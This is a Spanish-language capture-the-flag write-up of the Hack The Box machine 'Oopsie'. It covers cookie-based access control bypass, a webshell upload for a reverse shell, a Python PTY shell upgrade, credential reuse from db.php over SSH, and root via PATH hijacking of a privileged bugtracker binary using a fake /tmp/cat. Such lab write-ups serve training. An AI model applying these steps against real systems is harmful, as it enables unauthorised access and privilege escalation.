
# HTB - Unknown

## Machine Information

| Information          | Value           |
| -------------------- | --------------- |
| Machine              | Oopsie          |
| IP                   | -------------   |
| OS                   | Linux           |
| Difficulty           | Easy            |
| Initial Access       | Web Application |
| Privilege Escalation | PATH Hijacking  |

# 1. Reconocimiento

Para comenzar con la máquina se realiza una enumeración del servicio web utilizando Burp Suite como proxy.

En mi caso utilizo FoxyProxy para configurar fácilmente el navegador y enviar el tráfico de Firefox hacia Burp Suite.

El objetivo de esta primera fase es interceptar y analizar las peticiones HTTP de la aplicación, identificar las diferentes rutas disponibles y observar cómo maneja la autenticación y las cookies.

Después de mapear la aplicación, se identifica una página de login.

# 2. Enumeración de la aplicación web

La aplicación contiene un panel de administración accesible mediante:

```text
http://10.129.89.154/cdn-cgi/login/admin.php?content=accounts&id=1
```

Una parte importante de la enumeración consiste en analizar cómo la aplicación utiliza las cookies para determinar el usuario o el contenido que puede visualizar.

Al modificar la cookie desde nuestra propia sesión, es posible enumerar diferentes contenidos o usuarios de la aplicación.

Esto permite identificar que existe un usuario con privilegios administrativos.

Sin embargo, para realizar correctamente esta enumeración es necesario hacerlo desde una sesión válida.

Primero iniciamos sesión como:

```text
guest
```

Una vez autenticados como `guest`, podemos analizar las peticiones y modificar los valores relacionados con la sesión para comprobar qué información podemos alcanzar.

Este detalle es importante porque el comportamiento de la aplicación cambia cuando las peticiones se realizan desde una sesión autenticada.

# 3. Upload y Reverse Shell

Después de obtener acceso a la aplicación, encontramos una funcionalidad que permite subir archivos.

El objetivo es aprovechar esta funcionalidad para subir una reverse shell.

Para realizarlo utilicé una webshell/reverse shell disponible en el repositorio de BlackArch:

[BlackArch Webshells](https://github.com/BlackArch/webshells.git?utm_source=chatgpt.com)

Después de subir el archivo, identificamos el directorio donde la aplicación almacena los archivos.

El path utilizado para ejecutar la reverse shell es:

```text
/uploads/reverse-shell
```

Al acceder al archivo desde el navegador, el código se ejecuta en el servidor y obtenemos una conexión de vuelta.

En este punto conseguimos acceso inicial a la máquina mediante una shell como el usuario utilizado por el servidor web.

# 4. Upgrade de Shell

La shell obtenida inicialmente es una reverse shell limitada o `dumb shell`.

Para trabajar cómodamente con ella, podemos convertirla en una pseudo-terminal utilizando Python.

Primero ejecutamos:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Después suspendemos temporalmente la conexión:

```text
Ctrl + Z
```

En nuestra máquina ejecutamos:

```bash
stty raw -echo; fg
```

Finalmente configuramos las variables de entorno:

```bash
export TERM=xterm
export SHELL=bash
```

El proceso completo queda:

```text
1. python3 -c 'import pty;pty.spawn("/bin/bash")'
2. Ctrl + Z
3. stty raw -echo; fg
4. export TERM=xterm
5. export SHELL=bash
```

## ¿Por qué funciona?

`pty.spawn()` crea una pseudo-terminal que hace que la shell se comporte de una manera mucho más cercana a una terminal real.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

El comando:

```bash
stty raw -echo
```

modifica la configuración de la terminal local.

`raw` permite que los caracteres sean enviados directamente, mientras que `-echo` evita que nuestra terminal duplique los caracteres introducidos.

Finalmente:

```bash
fg
```

devuelve la conexión suspendida al primer plano.

Después podemos configurar:

```bash
export TERM=xterm
export SHELL=bash
```

Esto mejora todavía más el comportamiento de la terminal, permitiendo utilizar funciones como las flechas, `Ctrl+C`, comandos interactivos y otras características de una terminal normal.

# 5. Obtención de credenciales

Una vez dentro de la máquina comenzamos la enumeración local.

Durante la revisión de los archivos de la aplicación encontramos:

```text
db.php
```

Este archivo contiene información relacionada con la base de datos.

Al analizarlo encontramos una contraseña que está asociada con el usuario:

```text
robert
```

Como SSH se encuentra habilitado en la máquina, podemos utilizar estas credenciales para acceder directamente como `robert`.

```bash
ssh robert@10.129.89.154
```

Introducimos la contraseña encontrada en `db.php`.

De esta manera obtenemos una sesión SSH como:

```text
robert
```

Una vez dentro podemos volver a establecer:

```bash
export TERM=xterm
```

# 6. User Flag

Después de obtener acceso como `robert`, buscamos la flag del usuario.

La flag se encuentra en el directorio personal de `robert`.

```bash
cat ~/user.txt
```

Con esto obtenemos la `user flag`.

# 7. Enumeración para Privilege Escalation

Ahora que tenemos acceso como `robert`, debemos determinar qué permisos especiales existen en el sistema.

Una de las primeras cosas que podemos revisar son los grupos a los que pertenece nuestro usuario:

```bash
id
```

Durante esta enumeración encontramos un grupo llamado:

```text
bugtracker
```

Esto resulta interesante porque pertenecer a un grupo específico puede otorgar permisos adicionales sobre determinados archivos o binarios.

Para localizar archivos pertenecientes a este grupo utilizamos:

```bash
find / -group bugtracker 2>/dev/null
```

El resultado nos permite identificar un archivo relacionado con `bugtracker` ubicado en:

```text
/bin/
```

# 8. Enumeración del binario bugtracker

Analizamos el archivo encontrado:

```bash
ls -la /bin/bugtracker
```

Posteriormente ejecutamos el programa para observar su comportamiento.

Al ejecutarlo podemos observar que internamente realiza una llamada a:

```bash
cat
```

Sin utilizar una ruta absoluta como:

```bash
/bin/cat
```

En su lugar, simplemente llama:

```bash
cat
```

Esto es importante porque significa que el sistema necesita buscar el ejecutable `cat` utilizando las rutas definidas en la variable de entorno:

```bash
PATH
```

Esta situación puede ser vulnerable a **PATH Hijacking**.

# 9. PATH Hijacking

El concepto fundamental detrás del ataque es sencillo.

Si un programa privilegiado ejecuta:

```bash
cat
```

en lugar de:

```bash
/bin/cat
```

podemos intentar colocar nuestro propio ejecutable llamado `cat` en una ubicación que aparezca antes que `/bin` dentro del `PATH`.

Primero creamos un archivo llamado `cat` en `/tmp`:

```bash
echo '/bin/sh' > /tmp/cat
```

Le damos permisos de ejecución:

```bash
chmod +x /tmp/cat
```

Después modificamos el `PATH` para que `/tmp` sea la primera ubicación donde el sistema busque ejecutables:

```bash
export PATH=/tmp:$PATH
```

Ahora, cuando `bugtracker` intente ejecutar:

```bash
cat
```

el sistema encontrará primero:

```text
/tmp/cat
```

en lugar de:

```text
/bin/cat
```

El archivo que creamos contiene:

```bash
/bin/sh
```

por lo que termina ejecutándose una shell.

Ejecutamos nuevamente el binario vulnerable:

```bash
/bin/bugtracker
```

La llamada a `cat` termina ejecutando nuestro archivo controlado por nosotros.

Comprobamos el usuario:

```bash
whoami
```

Resultado:

```text
root
```

Hemos conseguido escalar privilegios hasta `root`.

# 10. Lectura de la Root Flag

Hay un detalle importante después de realizar el PATH hijacking.

Nuestro `cat` falso ya no funciona como el `cat` original, porque su contenido únicamente ejecuta:

```bash
/bin/sh
```

Por lo tanto, si intentamos utilizar `cat` para leer archivos, estaremos ejecutando nuestra shell falsa en lugar del programa original.

Para leer la flag podemos utilizar otro comando, por ejemplo:

```bash
head /root/root.txt
```

De esta manera obtenemos la `root flag`.

# 11. PATH Corrupto

Durante la explotación, modificar el `PATH` puede provocar que comandos normales dejen de funcionar correctamente.

Para restaurar un `PATH` convencional podemos utilizar:

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Esto vuelve a colocar los directorios estándar del sistema en la variable `PATH`.

# 12. PATH Hijacking: concepto general

El ataque utilizado en esta máquina puede resumirse de la siguiente manera.

Un binario privilegiado ejecuta un comando sin especificar su ruta absoluta:

```bash
cat
```

en lugar de:

```bash
/bin/cat
```

Creamos nuestro propio ejecutable:

```bash
echo '/bin/bash' > /tmp/cat
chmod +x /tmp/cat
```

Después colocamos `/tmp` al principio del `PATH`:

```bash
export PATH=/tmp:$PATH
```

Cuando el binario vulnerable ejecuta:

```bash
cat
```

el sistema busca el comando siguiendo el orden de `PATH`.

Como `/tmp` aparece primero, encuentra:

```text
/tmp/cat
```

y ejecuta nuestro archivo.

Si el binario vulnerable tiene privilegios elevados, nuestra shell puede ejecutarse con esos mismos privilegios.

Este es el principio fundamental de **PATH Hijacking**.

Un detalle importante es que el ataque depende de que el programa utilice una ruta relativa al comando y de que el entorno permita controlar el `PATH`. Si el programa utilizara:

```bash
/bin/cat
```

el ataque no funcionaría porque la ruta del ejecutable estaría especificada explícitamente.

# 13. Attack Path

```text
Burp Suite
    |
Web Application
    |
Login
    |
Guest Session
    |
Cookie Manipulation
    |
Web File Upload
    |
Reverse Shell
    |
Shell Upgrade
    |
db.php
    |
Robert Credentials
    |
SSH
    |
robert
    |
id
    |
bugtracker group
    |
/bin/bugtracker
    |
Command executed without absolute path
    |
PATH Hijacking
    |
/tmp/cat
    |
/bin/sh
    |
root
```

# 14. Vulnerabilities & Techniques

* Web Application Enumeration
* Burp Suite Proxy
* Session/Cookie Manipulation
* Authenticated Access Control Bypass
* Arbitrary File Upload
* Reverse Shell
* Shell Upgrade using Python PTY
* Sensitive Information Disclosure
* Hardcoded Credentials in `db.php`
* Credential Reuse
* SSH Authentication
* Linux Group Enumeration
* Privilege Escalation Enumeration
* Insecure Command Execution
* PATH Hijacking
* Privilege Escalation to root

# 15. Lessons Learned

Esta máquina demuestra la importancia de no quedarse únicamente con la explotación inicial.

El acceso a la aplicación web por sí solo no era suficiente. Después de obtener la reverse shell fue necesario realizar una segunda fase de enumeración para encontrar credenciales en `db.php`, utilizarlas mediante SSH y posteriormente buscar una forma de escalar privilegios.

La parte más importante de la escalada fue entender cómo funciona `PATH`.

Cuando un programa ejecuta:

```bash
cat
```

el sistema necesita buscar dónde se encuentra ese ejecutable.

En cambio, cuando ejecuta:

```bash
/bin/cat
```

no existe esa posibilidad porque la ruta ya está definida.

Por eso, siempre que encontremos un binario privilegiado que ejecute comandos sin rutas absolutas, debemos considerar la posibilidad de realizar un PATH Hijacking.

La lección principal de esta máquina es:

```text
Espera lo inesperado.
```

pwned :)))))
